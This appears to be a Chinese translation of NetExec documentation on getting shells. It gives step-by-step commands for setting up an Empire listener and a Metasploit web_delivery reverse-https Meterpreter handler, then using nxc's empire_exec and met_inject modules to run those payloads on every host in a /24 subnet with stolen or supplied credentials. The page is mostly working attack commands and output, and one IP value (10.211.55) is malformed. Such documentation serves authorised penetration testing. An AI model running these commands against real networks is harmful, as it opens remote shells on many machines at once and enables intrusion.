# 获取 Shell 基础

## 获取 Shell 基础

我们都喜欢 shell，这就是为什么 nxc 尽可能让获取 shell 变得简单！对整个 /24 网段获取 shell 确实有一些神奇之处。

## Empire Agent

{% hint style="info" %}
使用新版 Python3 版本的 Empire [https://github.com/BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire)
{% endhint %}

我们可以使用 `empire_exec` 模块来执行 Empire Agent 的初始 stager。在后台，该模块连接到 Empire 的 RESTful API，为指定的监听器生成启动器并执行它。

* 首先设置 REST API：

```
#~ python powershell-empire --rest --user empireadmin --pass Password123!
[*] Loading modules from: /home/mpgn/Tools/Empire/lib/modules/
 * Starting Empire RESTful API on port: 1337
 * RESTful API token: l5l051eqiqe70c75dis68qjheg7b19di7n8auzml
 * Running on https://0.0.0.0:1337/ (Press CTRL+C to quit)
```

* 其次设置监听器：

```
(Empire: listeners) > set Name test
(Empire: listeners) > set Host 192.168.10.3
(Empire: listeners) > set Port 9090
(Empire: listeners) > set CertPath data/empire.pem
(Empire: listeners) > run
(Empire: listeners) > list

[*] Active listeners:

  ID    Name              Host                                 Type      Delay/Jitter   KillDate    Redirect Target
  --    ----              ----                                 -------   ------------   --------    ---------------
  1     test              http://192.168.10.3:9090                 native    5/0.0                      

(Empire: listeners) > 
```

nxc 用于认证 Empire RESTful API 的用户名和密码存储在位于 ~/.nxc/nxc.conf 的 nxc.conf 文件中：

```
[Empire]
api_host=127.0.0.1
api_port=1337
username=empireadmin
password=Password123!

[Metasploit]
rpc_host=127.0.0.1
rpc_port=55552
password=abc123
```

* 然后只需运行 `empire_exec` 模块并指定监听器名称：

```
#~ NetExec 192.168.10.0/24 -u username -p password -M empire_exec -o LISTENER=test
```

## Meterpreter

我们可以使用 `metinject` 模块通过 [Invoke-MetasploitPayload](https://github.com/jaredhaight/Invoke-MetasploitPayload) `Invoke-MetasploitPayload.ps1` 脚本启动 meterpreter。

在你的 Metasploit 实例上，运行以下命令

```
use exploit/multi/script/web_delivery
```

SRVHOST 和 SRVPORT 变量用于运行托管脚本的 web 服务器

```
set SRVHOST 10.211.55
set SRVPORT 8443
```

`target` 变量决定我们使用的脚本类型。`2` 表示 PowerShell

```
set target 2
```

选择你的 payload。在这个例子中，我们将使用一个反向 https meterpreter payload

```
set payload windows/meterpreter/reverse_https
set LHOST 10.211.55
set LPORT 443
```

运行 exploit

```
run -j
```

运行后，web_delivery 模块将启动 web 服务器来托管脚本和反向监听器以接收我们的 meterpreter 会话。

```
msf exploit(web_delivery) > run -j
[*] Exploit running as background job.

[*] Started HTTPS reverse handler on https://10.211.55.4:8443/
[*] Using URL: http://10.211.55.4:8080/eYEssEwv2D
[*] Local IP: http://10.211.55.4:8080/eYEssEwv2D
[*] Server started.
```

* 然后只需运行 `met_inject` 模块并指定 LHOST 和 LPORT 值：

```
#~ NetExec 192.168.10.0/24 -u username -p password -M met_inject -o SRVHOST=192.168.10.3 SRVPORT=8443 RAND=eYEssEwv2D SSL=http
```
